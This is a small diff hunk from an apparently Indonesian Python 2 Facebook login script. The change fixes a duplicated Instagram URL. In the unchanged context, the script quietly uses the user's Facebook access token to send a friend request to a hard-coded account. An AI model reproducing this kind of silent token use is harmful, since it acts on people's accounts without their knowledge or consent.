@@ -134,7 +134,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.instagram.com/chairilsehati_21/https://www.instagram.com/chairilsehati_21/')
+				os.system('xdg-open https://www.instagram.com/chairilsehati_21/')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
